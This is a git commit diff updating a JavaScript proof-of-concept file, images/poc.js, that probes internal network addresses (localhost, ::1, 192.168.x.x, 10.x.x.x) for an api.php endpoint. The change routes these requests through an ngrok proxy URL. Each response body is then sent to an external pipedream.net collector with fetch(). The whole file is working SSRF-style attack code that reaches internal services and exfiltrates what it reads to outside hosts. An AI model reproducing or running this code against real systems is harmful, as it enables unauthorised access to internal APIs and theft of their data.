1ac0adaa0192042117d13d7bd0c8ea299f45757a
hashgrem <44004683+hashgrem@users.noreply.github.com>
2024-10-31 17:02:13 +0100

    Update poc.js

--- images/poc.js
+++ images/poc.js
@@ -3,23 +3,27 @@ const localIps = [
     "http://localhost/api.php",
     "http://[::1]/api.php",
     "http://192.168.0.1/api.php",
-    "http://10.0.0.1/api.php"
+    "http://192.168.1.1/api.php",
+    "http://10.0.0.1/api.php",
+    "http://10.0.1.1/api.php"
 ];
 
+const proxyUrl = "https://e2cd-92-149-40-183.ngrok-free.app/proxy?url=";
+
 function fetchInternalAPI() {
-    console.log('func called');
+    console.log("Function called");
     localIps.forEach(ip => {
-        fetch(ip, {
-            headers: {
-                "Referer": "http://127.0.0.1/"
-            }
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log(`Resp from ${ip}:`, data);
-            fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
-        })
-        .catch(error => console.error(`Error fetching ${ip}:`, error));
+        
+        const targetUrl = proxyUrl + encodeURIComponent(ip);
+        fetch(targetUrl)
+            .then(response => response.text())
+            .then(data => {
+                console.log(`Resp from ${ip} via proxy:`, data);
+
+                
+                fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
+            })
+            .catch(error => console.error(`Error fetching ${ip} via proxy:`, error));
     });
 }
 
